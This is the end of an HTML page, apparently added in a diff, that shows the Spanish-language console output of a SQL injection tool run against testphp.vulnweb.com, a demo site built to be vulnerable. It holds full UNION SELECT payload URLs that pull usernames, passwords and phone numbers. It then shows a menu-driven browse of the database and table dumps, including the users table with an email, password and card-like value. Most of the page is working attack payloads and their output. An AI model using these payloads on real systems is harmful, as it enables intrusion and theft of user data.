+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,name,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;lorde_Henrique&#x27;]
+
+[!] Buscando los datos de la columna pass
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,pass,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;test&#x27;]
+
+[!] Buscando los datos de la columna phone
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,phone,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;83988381501&#x27;]
+
+[!] Buscando los datos de la columna uname
+
+[!] Utilizando el payload: http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select &quot;parametro0&quot;,group_concat(&quot;&lt;SQLI&gt;&quot;,uname,&quot;&lt;/SQLI&gt;&quot;),&quot;parametro2&quot;,&quot;parametro3&quot;,&quot;parametro4&quot;,&quot;parametro5&quot;,&quot;parametro6&quot;,&quot;parametro7&quot;,&quot;parametro8&quot;,&quot;parametro9&quot;,&quot;parametro10&quot; from acuart.users -- -=17&amp;prueba=5
+[+] Se han encontrado 1 datos:  [&#x27;test&#x27;]
+[+] Terminado el proceso de analisis de la pagina
+
+
+
+Selecciona una opcion:
+
+    1. Seleccionar base de datos
+    2. Ver base de datos
+    3. Salir
+
+-&gt; 1
+
+Selecciona una de las siguientes bases de datos: acuart
+
+-&gt; acuart
+
+Selecciona una opcion:
+
+    1. Ver tabla
+    2. Volver a seleccion de base de datos
+    3. Salir
+
+[acuart] -&gt; 1
+
+Selecciona una de las siguientes tablas: artists carts categ featured guestbook pictures products users
+
+[acuart] -&gt; users
++-------------------------------------+----------------------------------+---------------------+-----------------------+----------------+------+-------------+-------+
+|               address               |               cart               |          cc         |         email         |      name      | pass |    phone    | uname |
++-------------------------------------+----------------------------------+---------------------+-----------------------+----------------+------+-------------+-------+
+| https://github.com/henriquecesar139 | ee641421945e33ee9b6a1606ba28c017 | 4002-8922-4002-8922 | nqueroprova@gmail.com | lorde_Henrique | test | 83988381501 |  test |
++-------------------------------------+----------------------------------+---------------------+-----------------------+----------------+------+-------------+-------+
+
+Selecciona una opcion:
+
+    1. Ver tabla
+    2. Volver a seleccion de base de datos
+    3. Salir
+
+[acuart] -&gt; 1
+
+Selecciona una de las siguientes tablas: artists carts categ featured guestbook pictures products users
+
+[acuart] -&gt; categ
++--------+---------------------------------------------------------------------------------------+-----------+
+| cat_id |                                         cdesc                                         |   cname   |
++--------+---------------------------------------------------------------------------------------+-----------+
+|   1    |       Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.       |  Posters  |
+|        |     Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis |           |
+|        |         nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.     |           |
+|        |                                       Cras venenati                                   |           |
+|   2    |       Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.       | Paintings |
+|        |     Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis |           |
+|        |         nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.     |           |
+|        |                                       Cras venenati                                   |           |
+|   3    |       Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.       |  Stickers |
+|        |     Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis |           |
+|        |         nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.     |           |
+|        |                                       Cras venenati                                   |           |
+|   4    |       Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.       |  Graffity |
+|        |     Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis |           |
+|        |                      nulla. In hac habitasse platea dictumst. Nulla                   |           |
++--------+---------------------------------------------------------------------------------------+-----------+
+
+Selecciona una opcion:
+
+    1. Ver tabla
+    2. Volver a seleccion de base de datos
+    3. Salir
+
+[acuart] -&gt; 2
+
+Selecciona una opcion:
+
+    1. Seleccionar base de datos
+    2. Ver base de datos
+    3. Salir
+
+-&gt; 3
+
+</div></code></pre>
+
+    </body>
+    </html>
